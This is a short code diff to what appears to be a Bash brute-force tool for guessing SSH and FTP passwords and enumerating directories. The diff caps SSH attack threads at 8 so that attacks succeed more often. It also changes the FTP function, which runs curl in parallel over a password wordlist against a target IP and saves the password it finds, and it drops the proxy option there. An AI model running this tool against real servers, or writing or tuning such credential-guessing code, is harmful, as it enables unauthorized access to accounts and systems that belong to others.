@@ -57,6 +57,10 @@ if [[ ! $threads ]]
 then
 echo please indicate the number of threads with the -t flag && exit
 fi
+if [[ $type == "ssh" ]] && [[ $threads -gt "8" ]]
+then
+echo To increase chances of a successful SSH attack, limit the number of threads to 8. && exit
+fi
 if [[ ! $user ]] && [[ $type != "direnum" ]]
 then
 echo please indicate the desired user name with the -u flag unless using direnum && exit
@@ -136,7 +140,7 @@ fi
 function ftp {
 if [[ $wordlist ]] && [[ -z $characters ]]
 then
-parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy ftp://$ip -u $user:{} :::: $wordlist |\
+parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' ftp://$ip -u $user:{} :::: $wordlist |\
 awk '{if($1 == "226") {print "Found password -> " $2; exit}}' > .password
 elif [[ -z $wordlist ]] && [[ $characters ]]
 then
@@ -164,7 +168,6 @@ pid=$!
 fi
 
 update &
-updatepid=$!
 
 if [[ -e .password ]]; then rm .password
 fi
